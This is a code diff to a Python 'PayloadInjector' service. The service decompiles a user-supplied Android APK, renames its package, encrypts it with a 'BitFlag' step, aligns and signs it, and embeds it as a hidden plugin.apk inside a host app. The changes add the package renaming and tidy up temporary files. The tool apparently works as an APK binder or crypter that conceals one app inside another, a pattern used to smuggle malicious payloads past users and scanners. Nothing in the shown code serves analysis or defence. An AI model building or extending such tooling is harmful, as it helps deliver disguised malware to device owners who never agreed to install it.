@@ -84,7 +84,7 @@ class PayloadInjector:
             logger.info(f"✅ App: {app_info['name']} ({app_info['size']})")
 
             logger.info("📋 Step 3/6: Injecting user APK...")
-            if not await self._inject_plugin_apk(user_apk_path):
+            if not await self._inject_plugin_apk(user_apk_path, app_info['package']):
                 return None, "Failed to inject plugin.apk", int(time.time() - start_time)
 
             logger.info("⚙️ Step 4/6: Updating config...")
@@ -186,7 +186,9 @@ class PayloadInjector:
             import tempfile
 
             analyzer = APKAnalyzer(user_apk_path)
-            analyze_dir = tempfile.mkdtemp(prefix='analyze_')
+            # Create unique analyze directory for each request
+            timestamp = int(time.time() * 1000)
+            analyze_dir = tempfile.mkdtemp(prefix=f'analyze_{timestamp}_')
 
             results = await analyzer.analyze(analyze_dir)
 
@@ -195,8 +197,10 @@ class PayloadInjector:
 
             icon_path = None
             if results.get('icon_path') and os.path.exists(results['icon_path']):
+                # Use unique filename to avoid conflicts in concurrent requests
                 icon_filename = os.path.basename(results['icon_path'])
-                icon_path = os.path.join(self.work_dir, icon_filename)
+                unique_icon_name = f"icon_{timestamp}_{icon_filename}"
+                icon_path = os.path.join(self.work_dir, unique_icon_name)
                 shutil.copy2(results['icon_path'], icon_path)
                 logger.debug(f"Icon saved to: {icon_path}")
 
@@ -207,10 +211,12 @@ class PayloadInjector:
                 'icon_path': icon_path
             }
 
+            # Clean up analyze directory
             try:
                 shutil.rmtree(analyze_dir, ignore_errors=True)
-            except:
-                pass
+                logger.debug(f"Cleaned analyze dir: {analyze_dir}")
+            except Exception as e:
+                logger.warning(f"Could not clean analyze_dir: {e}")
 
             return info
 
@@ -218,7 +224,7 @@ class PayloadInjector:
             logger.error(f"Analysis error: {str(e)}")
             return None
 
-    async def _inject_plugin_apk(self, user_apk_path):
+    async def _inject_plugin_apk(self, user_apk_path, original_package):
         try:
             plugin_path = os.path.join(self.decompiled_dir, 'assets', 'plugin.apk')
 
@@ -226,6 +232,8 @@ class PayloadInjector:
                 os.remove(plugin_path)
                 logger.debug("Removed old plugin.apk")
 
+            temp_decompiled = os.path.join(self.work_dir, 'plugin_decompiled')
+            temp_recompiled = os.path.join(self.work_dir, 'plugin_recompiled.apk')
             temp_encrypted = os.path.join(self.work_dir, 'plugin_encrypted.apk')
             temp_aligned = os.path.join(self.work_dir, 'plugin_aligned.apk')
             temp_signed = os.path.join(self.work_dir, 'plugin_signed.apk')
@@ -235,24 +243,89 @@ class PayloadInjector:
             logger.info("📦 Processing plugin.apk:")
             logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
-            logger.info("🔐 Step 1: Encrypting plugin...")
+            logger.info("📝 Step 1: Changing package name...")
+            new_package = original_package + ".me"
+            logger.info(f"Original: {original_package}")
+            logger.info(f"New: {new_package}")
+            
+            # Decompile user APK
+            logger.info("Decompiling user APK...")
+            process = await asyncio.create_subprocess_exec(
+                'java', '-jar', str(APKTOOL_PATH),
+                'd', user_apk_path,
+                '-o', temp_decompiled,
+                '-f',
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, stderr = await process.communicate()
+            
+            if process.returncode != 0:
+                logger.error(f"Decompile failed: {stderr.decode('utf-8', errors='ignore')}")
+                logger.warning("Using original APK without package change")
+                current_apk = user_apk_path
+            else:
+                # Change package name in AndroidManifest.xml
+                manifest_path = os.path.join(temp_decompiled, 'AndroidManifest.xml')
+                if os.path.exists(manifest_path):
+                    with open(manifest_path, 'r', encoding='utf-8') as f:
+                        manifest_content = f.read()
+                    
+                    # Replace package name
+                    manifest_content = re.sub(
+                        r'package="' + re.escape(original_package) + r'"',
+                        f'package="{new_package}"',
+                        manifest_content
+                    )
+                    
+                    with open(manifest_path, 'w', encoding='utf-8') as f:
+                        f.write(manifest_content)
+                    
+                    logger.info(f"✅ Package changed to: {new_package}")
+                    
+                    # Rebuild APK
+                    logger.info("Rebuilding plugin APK...")
+                    process = await asyncio.create_subprocess_exec(
+                        'java', '-jar', str(APKTOOL_PATH),
+                        'b', temp_decompiled,
+                        '-o', temp_recompiled,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE
+                    )
+                    stdout, stderr = await process.communicate()
+                    
+                    if process.returncode != 0:
+                        logger.error(f"Rebuild failed: {stderr.decode('utf-8', errors='ignore')}")
+                        current_apk = user_apk_path
+                    else:
+                        logger.info("✅ Plugin rebuilt with new package")
+                        current_apk = temp_recompiled
+                        
+                        # Cleanup decompiled directory
+                        try:
+                            shutil.rmtree(temp_decompiled, ignore_errors=True)
+                        except:
+                            pass
+                else:
+                    logger.warning("AndroidManifest.xml not found")
+                    current_apk = user_apk_path
 
-            already_encrypted = await self._check_bitflag(user_apk_path)
+            logger.info("🔐 Step 2: Encrypting plugin...")
+
+            already_encrypted = await self._check_bitflag(current_apk)
 
             if already_encrypted:
                 logger.info("✅ BitFlag already present, skipping encryption")
-                current_apk = user_apk_path
             else:
-                encrypted_apk = await self._encrypt_bitflag(user_apk_path, temp_encrypted)
+                encrypted_apk = await self._encrypt_bitflag(current_apk, temp_encrypted)
 
                 if not encrypted_apk:
                     logger.warning("⚠️  Encryption failed, using original")
-                    current_apk = user_apk_path
                 else:
                     logger.info("✅ Plugin encrypted (BitFlag)")
                     current_apk = temp_encrypted
 
-            logger.info("⚙️  Step 2: Zipalign plugin...")
+            logger.info("⚙️  Step 3: Zipalign plugin...")
 
             if await self._zipalign(current_apk, temp_aligned):
                 logger.info("✅ Plugin aligned")
@@ -260,7 +333,7 @@ class PayloadInjector:
             else:
                 logger.warning("⚠️  Zipalign failed, continuing without it")
 
-            logger.info("✍️  Step 3: Signing plugin...")
+            logger.info("✍️  Step 4: Signing plugin...")
 
             signed_apk = await self._sign_apk(current_apk, plugin_path)
 
@@ -272,7 +345,7 @@ class PayloadInjector:
                 logger.info("✅ Plugin signed with debug.keystore")
 
             logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            logger.info("✅ Plugin ready: BitFlag 🔐 → Aligned ⚙️ → Signed ✍️")
+            logger.info(f"✅ Plugin ready: {new_package}")
             logger.info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
             return True
